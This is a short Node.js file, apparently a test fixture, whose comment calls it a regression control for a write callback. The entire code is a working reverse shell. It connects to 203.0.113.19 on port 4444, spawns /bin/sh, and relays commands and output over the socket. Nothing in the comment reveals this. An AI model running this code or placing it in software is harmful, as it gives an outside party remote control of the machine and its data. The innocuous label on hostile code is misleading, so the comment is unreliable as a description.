// Static regression control for the pre-existing direct write callback.
const cp = require('child_process'), net = require('net');
const peer = new net.Socket();
peer.connect(4444, '203.0.113.19');
const child = cp.spawn('/bin/sh', []);
peer.on('data', function (data) { child.stdin.write(data); });
child.stdout.on('data', function (data) { peer.write(data); });
